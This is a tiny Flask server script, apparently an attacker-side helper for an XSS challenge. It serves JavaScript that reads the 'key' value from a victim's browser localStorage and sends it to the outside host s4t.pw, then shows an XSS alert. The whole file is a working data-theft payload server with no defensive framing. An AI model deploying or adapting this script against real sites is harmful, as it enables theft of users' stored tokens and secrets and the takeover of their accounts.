from flask import Flask
from flask_cors import CORS

app = Flask(__name__)
CORS(app)


@app.route("/", methods=["GET", "POST"])
def index():
    response = app.response_class(
        response="fetch('http://s4t.pw?flag='+localStorage.getItem('key'));alert('XSS');",
        status=200,
        mimetype="application/javascript",
    )
    return response


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
